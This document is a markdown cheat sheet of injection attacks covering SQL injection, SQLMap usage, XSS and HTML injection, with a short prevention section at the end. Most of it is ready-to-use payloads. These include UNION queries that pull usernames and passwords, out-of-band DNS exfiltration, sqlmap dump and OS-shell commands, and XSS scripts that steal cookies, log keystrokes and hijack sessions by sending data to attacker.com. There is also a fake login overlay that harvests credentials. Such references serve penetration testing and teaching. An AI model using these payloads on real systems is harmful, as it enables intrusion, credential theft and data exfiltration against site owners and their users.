# Injection Attacks Reference

Comprehensive guide covering SQL injection, XSS, HTML injection, and SQLMap automation.

## SQL Injection (SQLi)

### Detection

Test user-controllable inputs that interact with database queries:

```
Injection points: URL params (?id=1), form fields, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For)
```

#### Detection Test Sequence
```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```

#### Logic Testing
```sql
-- True condition tests
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--

-- False condition tests
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

### Exploitation Techniques

#### UNION-Based Extraction
```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--  (continue until error)

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Extraction
```sql
-- MSSQL
1' AND 1=CONVERT(int,(SELECT @@version))--
-- MySQL via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
-- PostgreSQL
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Blind Boolean-Based
```sql
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Time-Based Blind
```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
-- MSSQL
1'; WAITFOR DELAY '0:0:5'--
-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Out-of-Band (OOB)
```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
-- MySQL
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
```

### Authentication Bypass
```sql
admin'--
' OR '1'='1
' OR '1'='1'--
') OR ('1'='1
```

### Database Fingerprinting
```sql
-- MySQL: SELECT @@version / SELECT version()
-- MSSQL: SELECT @@version / SELECT @@servername
-- PostgreSQL: SELECT version()
-- Oracle: SELECT banner FROM v$version
```

### Information Schema Queries
```sql
-- MySQL/MSSQL
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
-- Oracle
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Filter Bypass Techniques

#### Character Encoding
```sql
%27 (single quote), %22 (double quote), %23 (hash)
%2527 (double URL encoding)
0x61646D696E (hex for 'admin' in MySQL)
```

#### Whitespace Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
```sql
SeLeCt, sElEcT  -- Case variation
SEL/*bypass*/ECT  -- Inline comments
SELSELECTECT → SELECT  -- Double writing
%00SELECT  -- Null byte
```

## SQLMap Automated Testing

### Enumeration Progression

| Stage | Command |
|-------|---------|
| Detect | `sqlmap -u "URL" --batch` |
| List Databases | `sqlmap -u "URL" --dbs --batch` |
| List Tables | `sqlmap -u "URL" -D dbname --tables --batch` |
| List Columns | `sqlmap -u "URL" -D dbname -T tablename --columns --batch` |
| Dump Data | `sqlmap -u "URL" -D dbname -T tablename --dump --batch` |

### Advanced Options
```bash
# From Burp request file
sqlmap -r /path/to/request.txt --dbs --batch

# High level/risk testing
sqlmap -u "URL" --dbs --batch --level=5 --risk=3

# Specific technique
sqlmap -u "URL" --dbs --batch --technique=BEUSTQ

# WAF bypass with tamper scripts
sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase

# OS shell (requires DBA privileges)
sqlmap -u "URL" --os-shell --batch
```

### SQLMap Technique Flags

| Flag | Technique |
|------|-----------|
| B | Boolean-based blind |
| T | Time-based blind |
| E | Error-based |
| U | UNION query-based |
| S | Stacked queries |
| Q | Out-of-band |

## Cross-Site Scripting (XSS)

### XSS Types

| Type | Persistence | Server-Side | Delivery |
|------|-------------|-------------|----------|
| Stored | Persistent in DB | Payload in response | Automatic on page view |
| Reflected | URL only | Payload in response | Victim clicks crafted URL |
| DOM-Based | Client-side only | Not in response | Client JS processes input |

### Detection Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert(1)</script>
javascript:alert(1)
```

### Context-Specific Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Exploitation Payloads
```html
<!-- Cookie stealing -->
<script>new Image().src='http://attacker.com/c='+btoa(document.cookie);</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key;}</script>

<!-- Session hijacking -->
<script>fetch('http://attacker.com/capture',{method:'POST',body:JSON.stringify({cookies:document.cookie,url:location.href})})</script>
```

### DOM XSS Sources and Sinks

**Dangerous Sinks:** `document.write()`, `element.innerHTML`, `eval()`, `setTimeout()`, `location.href`, `location.assign()`

**User-Controllable Sources:** `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, `postMessage`, `localStorage`

### XSS Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<script>\u0061lert(1)</script>

<!-- Obfuscation -->
<script>eval('al'+'ert(1)')</script>
<script>alert`1`</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

## HTML Injection

### Key Differences from XSS
- HTML injection: Only HTML tags rendered (no JS execution)
- Often a stepping stone to XSS
- Goals: defacement, phishing forms, malicious links

### Phishing via HTML Injection
```html
<!-- Fake login overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;">
  <h2>Session Expired</h2>
  <form action="http://attacker.com/capture" method="POST">
    <input type="text" name="username" placeholder="Username"><br>
    <input type="password" name="password" placeholder="Password"><br>
    <input type="submit" value="Login">
  </form>
</div>
```

### HTML Injection Types
- **Stored**: Persists in database (profile bios, comments)
- **Reflected GET**: Payload in URL parameters
- **Reflected POST**: Payload in POST data

### Advanced Techniques
```html
<!-- Meta redirect -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
<!-- iframe injection -->
<iframe src="http://attacker.com/malicious" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<!-- CSS injection -->
<style>body{display:none}</style>
```

### HTML Injection Bypass
```html
<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Tag splitting -->
<h
1>Split Tag</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>
```

## Prevention & Remediation

### SQL Injection Prevention
- Use parameterized queries / prepared statements
- Use ORM with proper escaping
- Input validation with whitelists
- Least privilege database accounts

### XSS Prevention
- Output encoding (context-aware)
- Content Security Policy (CSP) headers
- Use `textContent` instead of `innerHTML`
- Sanitize with DOMPurify
- Set HttpOnly, Secure, SameSite cookie flags

### HTML Injection Prevention
```php
// PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
// Python: from html import escape; safe = escape(input)
// JavaScript: element.textContent = userInput; // safe
```
